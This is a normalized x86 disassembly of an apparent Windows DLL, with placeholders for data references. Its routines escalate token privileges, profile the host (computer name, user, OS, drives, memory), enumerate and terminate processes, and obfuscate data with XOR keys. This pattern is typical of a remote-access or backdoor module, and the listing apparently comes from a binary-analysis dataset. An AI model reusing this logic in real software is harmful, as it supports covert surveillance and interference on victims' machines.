sub_71001000
sub esp 0x1c
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov esi [ LookupPrivilegeValueA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push 0x0
call esi
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
mov edi [ AdjustTokenPrivileges@IAT ]
push 0x0
push 0x0
lea ecx [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x10 ]
push 0x0
push ecx
push 0x0
push edx
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x34 ] eax
call edi
lea eax [ esp + 0xc ]
push eax
push rw-data
push 0x0
call esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
push 0x0
push eax
push 0x0
push ecx
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x34 ] edx
call edi
mov edx [ esp + 0x8 ]
push edx
call [ CloseHandle@IAT ]
pop edi
pop esi
add esp 0x1c
retn
sub_710010c0
sub esp 0x700
push ebx
push ebp
push esi
push edi
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x310 ]
push 0x2000
[ edi ]
call [ malloc@IAT ]
mov ebx [ sprintf@IAT ]
add esp 0x4
mov ebp eax
mov ecx 0x800
xor eax eax
mov edi ebp
push rw-data
push ebp
[ edi ]
call ebx
add esp 0x8
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x310 ]
mov [ esp + 0x10 ] 0x10
push eax
push ecx
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x310 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x310 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x310 ]
[ edi ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x310 ]
push eax
push ecx
mov [ esp + 0x18 ] 0x200
call [ GetUserNameA@IAT ]
test eax eax
jne r-xdata
cmp eax 0xfa0
je r-xdata
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x58 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ GetSystemInfo@IAT ]
mov eax [ esp + 0x70 ]
cmp eax 0x24a
ja r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
sub eax 0x182
je r-xdata
mov eax [ esp + 0x28c ]
sub eax 0x0
je r-xdata
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x27c ] 0x94
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x310 ]
[ edi ]
lea ecx [ esp + 0x27c ]
push ecx
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
sub eax 0x64
jne r-xdata
lea edx [ esp + 0x310 ]
mov edi rw-data
dec eax
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x4c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call GetSystemPowerStatus
mov edx eax
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x7c ]
test edx edx
[ edi ]
je r-xdata
lea edx [ esp + 0x510 ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x7c ]
push rw-data
push edx
mov al [ esp + 0x4d ]
cmp al 0x80
je r-xdata
lea edx [ esp + 0x310 ]
mov edi rw-data
jmp r-xdata
dec eax
lea edx [ esp + 0x310 ]
je r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp [ eax * 4 + jump_table_710017d4 ]
cmp al 0xff
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x288 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
and edx 0xffff
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x7c ]
[ edi ]
mov eax [ esp + 0x284 ]
lea ecx [ esp + 0x510 ]
push ecx
mov ecx [ esp + 0x284 ]
push edx
push eax
lea edx [ esp + 0x31c ]
push ecx
push edx
lea eax [ esp + 0x90 ]
push rw-data
push eax
call ebx
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
xor eax eax
add esp 0x1c
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
mov esi [ wsprintfA@IAT ]
push ebx
lea eax [ esp + 0x80 ]
push rw-data
push eax
call esi
add esp 0xc
lea ecx [ esp + 0x7c ]
push ecx
call [ GetDriveTypeA@IAT ]
cmp eax 0x6
ja r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x700
retn
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
mov [ esp + 0x7c ] 0x0
jmp r-xdata
lea edi [ esp + 0x7c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
push ebx
lea eax [ esp + 0x314 ]
push rw-data
push eax
call esi
add esp 0xc
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push ecx
push edx
lea ecx [ esp + 0x30 ]
push eax
lea edx [ esp + 0x31c ]
push ecx
push edx
call [ GetDiskFreeSpaceA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x7c ]
mov edi rw-data
jmp r-xdata
lea ecx [ esp + 0x7c ]
push rw-data
push ecx
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
inc ebx
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x510 ]
imul eax [ esp + 0x1c ]
shr eax 0xa
mov ecx eax
imul eax [ esp + 0x24 ]
imul ecx [ esp + 0x20 ]
push ecx
push eax
push ebx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x14
lea edi [ esp + 0x510 ]
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x7c ]
call ebx
lea edi [ esp + 0x84 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ GetTickCount@IAT ]
mov edx eax
xor eax eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] eax
fild [ esp + 0x14 ]
mov ecx 0x80
lea edi [ esp + 0x7c ]
sub esp 0x8
fmul [ r--data ]
[ edi ]
fstp [ esp ]
lea eax [ esp + 0x84 ]
push rw-data
push eax
call ebx
lea edi [ esp + 0x8c ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x7c ]
[ edi ]
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x20
push eax
call [ GlobalMemoryStatus@IAT ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x30 ]
shr ecx 0x14
push ecx
mov ecx [ esp + 0x38 ]
shr edx 0x14
push edx
push eax
shr ecx 0x14
push ecx
lea edx [ esp + 0x8c ]
push rw-data
push edx
call ebx
add esp 0x18
or ecx 0xffffffff
lea edi [ esp + 0x7c ]
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov ebx 0x43
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x14 ] 0x18
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
sub_71001820
push esi
mov esi ecx
push edi
mov edi 0x2000
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
push 0x2000
call [ malloc@IAT ]
add esp 0x4
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
push 0x0
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
retn
push 0x0
push 0x2000
push eax
push 0x5
call [ esi ]
cmp eax 0xc0000004
jne r-xdata
push ebx
mov ebx [ realloc@IAT ]
mov eax [ esi + 0x4 ]
add edi 0x2000
push edi
push eax
call ebx
add esp 0x8
mov [ esi + 0x4 ] eax
push 0x0
push edi
push eax
push 0x5
call [ esi ]
cmp eax 0xc0000004
je r-xdata
pop ebx
sub_71001890
mov eax 0x2214
call sub_71007cf0
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
mov ebx ecx
push 0x2000
call esi
mov edi eax
mov ecx 0x800
xor eax eax
mov [ esp + 0x18 ] edi
[ edi ]
push 0x2000
call esi
mov ebp eax
mov ecx 0x800
xor eax eax
mov edi ebp
[ edi ]
mov [ esp + 0x1b ] al
mov eax [ ebx + 0x4 ]
add esp 0x8
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x18 ] eax
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_71001820
inc [ esp + 0x18 ]
mov [ esp + 0x13 ] 0x1
jmp r-xdata
push rw-data
push ebp
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x124 ]
push ecx
push rw-data
push ebp
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
mov ecx 0x82
xor eax eax
lea edi [ esp + 0x1c ]
[ edi ]
mov ecx [ edx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
mov ecx ebx
call sub_71001b50
mov eax [ ebx + 0x4 ]
push 0x0
push 0x0
lea edx [ esp + 0x22c ]
mov ecx [ eax + 0x3c ]
push 0x2000
push edx
push 0xffffffff
push ecx
push 0x200
push 0x0
call [ WideCharToMultiByte@IAT ]
mov eax [ ebx + 0x4 ]
lea edx [ esp + 0x224 ]
push edx
mov ecx [ eax + 0x44 ]
push ecx
push rw-data
push ebp
call [ sprintf@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x120 ]
or ecx 0xffffffff
[ edi ]
not ecx
lea eax [ esp + 0x1c ]
dec ecx
push eax
je r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push rw-data
push ebp
call [ sprintf@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov edx [ esp + 0x14 ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2214
retn
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
add ecx eax
mov al [ esp + 0x13 ]
test al al
mov [ ebx + 0x4 ] ecx
je r-xdata
sub_71001ab0
sub esp 0x1c
lea eax [ esp ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x4 ]
push ecx
push edx
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
add esp 0x1c
retn 0x8
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
neg edx
push 0x0
push 0x0
lea eax [ esp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x8 ]
push 0x0
sbb edx edx
push eax
and edx 0x2
push 0x0
push ecx
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x30 ] edx
call [ AdjustTokenPrivileges@IAT ]
mov edx [ esp ]
push edx
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x1c
retn 0x8
mov eax 0x1
add esp 0x1c
retn 0x8
sub_71001b50
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x8 ]
push eax
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_71001c61
xor ebx ebx
mov edi [ ebp - 0x20 ]
mov esi [ ebp - 0x1c ]
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push 0x8
push esi
call [ OpenProcessToken@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x28 ]
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov [ ebp - 0x30 ] ebx
lea edx [ ebp - 0x30 ]
push edx
push ebx
push ebx
push 0x1
mov eax [ ebp - 0x28 ]
push eax
mov edi [ GetTokenInformation@IAT ]
call edi
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x30 ]
lea edx [ ecx + ecx ]
push edx
call ??2@YAPAXI@Z
add esp 0x4
mov esi eax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x30 ]
add eax eax
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push esi
push 0x1
mov edx [ ebp - 0x28 ]
push edx
call edi
mov edi eax
mov [ ebp - 0x20 ] edi
call [ GetLastError@IAT ]
mov [ ebp - 0x3c ] eax
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x24 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esi [ ebp - 0x1c ]
mov eax 0x104
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
mov eax [ ebp + 0xc ]
lea edx [ eax + 0x104 ]
push edx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
mov edx [ esi ]
push edx
push ebx
call [ LookupAccountSidA@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
mov esp [ ebp - 0x18 ]
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_71001c61
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x28 ]
cmp eax ebx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
cmp eax ebx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_71001cb0
push ecx
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
mov ebp ecx
push 0x64
mov [ esp + 0x14 ] ebp
call esi
mov ebx eax
mov ecx 0x19
xor eax eax
mov edi ebx
[ edi ]
push 0x64
call esi
mov esi eax
add esp 0x8
mov ecx 0x19
xor eax eax
mov edi esi
push 0x1
[ edi ]
push rw-data
mov ecx ebp
call sub_71001ab0
mov eax [ esp + 0x18 ]
push eax
push 0x1
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
push ebp
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
push 0x0
push rw-data
call sub_71001ab0
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn 0x4
push 0x0
push ebp
call [ TerminateProcess@IAT ]
test eax eax
mov ecx 0x19
jne r-xdata
xor eax eax
mov edi esi
[ edi ]
mov eax [ esp + 0x18 ]
push eax
push rw-data
push esi
call [ sprintf@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
push 0x1f4
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ Sleep@IAT ]
xor eax eax
mov edi esi
[ edi ]
mov ecx [ esp + 0x18 ]
push ecx
push rw-data
push esi
call [ sprintf@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
sub_71001de0
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov ebx ecx
push 0x2000
call [ malloc@IAT ]
mov edi eax
mov ecx 0x800
xor eax eax
mov [ esp + 0x18 ] edi
[ edi ]
add esp 0x4
mov ecx ebx
call sub_71001820
mov edi [ esp + 0x1c ]
mov ebp [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
push edi
push 0x0
push 0x0
mov [ esp + 0x28 ] 0x0
call ebp
mov esi eax
lea eax [ esi + esi ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x1c ] eax
push esi
push eax
push 0xffffffff
push edi
push 0x0
push 0x0
call ebp
mov ebp [ _wcsnicmp@IAT ]
mov edx [ eax + 0x3c ]
test edx edx
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov ecx [ ebx + 0x4 ]
mov eax [ esp + 0x1c ]
push 0x4
mov edx [ ecx + 0x3c ]
push edx
push eax
call ebp
add esp 0xc
test eax eax
jne r-xdata
add ecx eax
mov [ ebx + 0x4 ] ecx
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
add ecx eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ ebx + 0x4 ] ecx
je r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + 0x44 ]
mov ecx ebx
push edx
call sub_71001cb0
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
sub_71001f60
push ebx
push ebp
push esi
push edi
call sub_71002030
mov ebx [ esp + 0x18 ]
mov ecx 0x800
xor eax eax
mov edi ebx
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov ebp [ esp + 0x1c ]
mov eax ecx
mov esi edi
mov edi ebx
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x18 ]
push esi
call sub_71002320
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
dec ecx
mov edi ebx
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi ecx
mov ecx ebp
mov eax ecx
add edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ edx + ebp ]
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
sub_71001fe0
mov eax [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi [ esp + 0x10 ]
push eax
push edi
call sub_71002200
mov esi eax
push esi
call sub_71002350
add esp 0xc
xor ebp ebp
test esi esi
jbe r-xdata
cmp [ edi + ebp - 0x1 ] 0x23
jne r-xdata
mov ecx rw-data
push ebx
mov eax edi
sub ecx edi
mov ebp esi
pop edi
pop esi
pop ebp
retn
mov [ edi + ebp - 0x1 ] 0x0
mov dl [ ecx + eax ]
mov bl [ eax ]
xor bl dl
mov [ eax ] bl
inc eax
dec esi
jne r-xdata
pop ebx
sub_71002030
sub esp 0xe8
push ebx
push ebp
push esi
push edi
mov ecx 0x32
xor eax eax
lea edi [ esp + 0x30 ]
[ edi ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
push ecx
mov [ esp + 0x1c ] ax
call [ time@IAT ]
lea edx [ esp + 0x28 ]
push edx
call [ _ftime@IAT ]
mov eax [ esp + 0x24 ]
mov ebx [ sprintf@IAT ]
add esp 0x8
lea ecx [ esp + 0x30 ]
push eax
push rw-data
push ecx
call ebx
mov edx [ esp + 0x34 ]
add esp 0xc
and edx 0xffff
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
call ebx
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x3c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x3c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ atoi@IAT ]
mov [ esp + 0x30 ] eax
add esp 0x10
fild [ esp + 0x20 ]
fmul [ r--data ]
call _ftol
xor eax 0xb38d5e19
lea ecx [ esp + 0x30 ]
cdq
xor eax edx
sub eax edx
push eax
push rw-data
push ecx
mov [ rw-data ] eax
call ebx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x30 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor edx edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x32
mov edi rw-data
[ edi ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov eax [ rw-data ]
mov ecx 0x64
mov cl [ edx + rw-data ]
mov edi rw-data
not cl
mov [ edx + rw-data ] cl
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
mov edx eax
mov esi eax
shr edx 0x6
and edx 0x1000000
and esi 0x1000000
xor edx esi
add eax eax
shr edx 0x18
or eax edx
dec ecx
jne r-xdata
mov [ rw-data ] eax
mov ecx 0x64
mov edx eax
mov esi eax
shr edx 0xd
and edx 0x20000
and esi 0x20000
xor edx esi
add eax eax
shr edx 0x11
or eax edx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
pop ebx
add esp 0xe8
retn
sub_71002200
mov eax 0x2004
call sub_71007cf0
push ebx
push ebp
